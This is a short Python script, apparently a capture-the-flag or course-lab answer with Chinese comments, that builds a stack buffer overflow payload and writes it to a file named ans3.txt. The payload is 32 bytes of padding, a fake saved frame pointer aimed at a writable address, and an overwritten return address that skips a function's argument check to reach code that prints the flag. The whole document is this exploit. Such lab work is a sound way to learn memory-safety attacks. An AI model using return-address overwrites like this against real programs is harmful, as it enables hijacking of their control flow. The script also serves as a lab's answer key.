import struct

padding = b'A' * 32

# 因为 func 结尾有 leave (pop rbp)，这 8 字节会被弹入 %rbp 寄存器
# func1 需要往 rbp-0x40 写数据，所以这里必须填一个可写的安全地址
fake_rbp = struct.pack('<Q', 0x403600)

# 跳过 func1 开头的参数检查，直接跳转到 0x40122b (打印 Flag 的代码段)
target_addr = struct.pack('<Q', 0x40122b)

payload = padding + fake_rbp + target_addr

with open('ans3.txt', 'wb') as f:
    f.write(payload)
